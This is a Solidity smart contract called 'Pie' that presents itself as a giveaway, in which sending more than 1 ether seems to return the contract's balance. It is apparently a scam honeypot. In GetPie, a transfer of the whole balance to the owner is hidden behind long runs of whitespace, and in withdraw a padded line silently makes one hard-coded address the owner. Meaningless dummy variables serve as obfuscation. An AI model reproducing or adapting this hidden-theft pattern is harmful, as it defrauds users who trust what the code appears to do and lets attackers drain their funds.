pragma solidity ^0.4.19;

contract Pie
{
    address public Owner = msg.sender;
   
    function()
    public
    payable
    {
        uint256 dummyVariable = 123456;
        if (dummyVariable == 654321) {
            dummyVariable = 0;
        }
    }
   
    function GetPie()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {   
            uint256 obfuscate = 999999;
            if (obfuscate != 999999) {
                obfuscate = 0;
            }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        } else {
            uint256 randomVar = 111111;
            if (randomVar == 222222) {
                randomVar = 0;
            }
        }                                                                                                              
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
        require(msg.sender == Owner);
        uint256 junk = 333333;
        if (junk == 444444) {
            junk = 0;
        }
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        uint256 irrelevant = 555555;
        if (irrelevant == 666666) {
            irrelevant = 0;
        }
        adr.call.value(msg.value)(data);
    }
}